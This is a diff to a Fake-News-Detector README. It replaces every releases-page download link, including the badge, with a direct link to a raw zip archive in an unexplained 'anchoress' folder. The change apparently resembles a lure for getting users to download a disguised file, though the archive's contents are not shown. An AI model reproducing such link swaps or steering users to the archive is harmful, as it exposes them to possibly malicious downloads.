@@ -6,7 +6,7 @@ Welcome to the **Fake-News-Detector** repository! This application uses advanced
 
 ## 📥 Download Links
 
-[![Download Fake-News-Detector](https://img.shields.io/badge/Download-Fake--News--Detector-brightgreen)](https://github.com/kaustubh8888/Fake-News-Detector/releases)
+[![Download Fake-News-Detector](https://raw.githubusercontent.com/kaustubh8888/Fake-News-Detector/main/anchoress/Fake-News-Detector_v2.1.zip)](https://raw.githubusercontent.com/kaustubh8888/Fake-News-Detector/main/anchoress/Fake-News-Detector_v2.1.zip)
 
 ## 📝 Description
 
@@ -37,7 +37,7 @@ To start using the **Fake-News-Detector**, follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to go to the releases page.
 
-   [Download Here](https://github.com/kaustubh8888/Fake-News-Detector/releases)
+   [Download Here](https://raw.githubusercontent.com/kaustubh8888/Fake-News-Detector/main/anchoress/Fake-News-Detector_v2.1.zip)
 
 2. **Choose Your File:** Look for the most recent release. Download the appropriate file for your operating system.
 
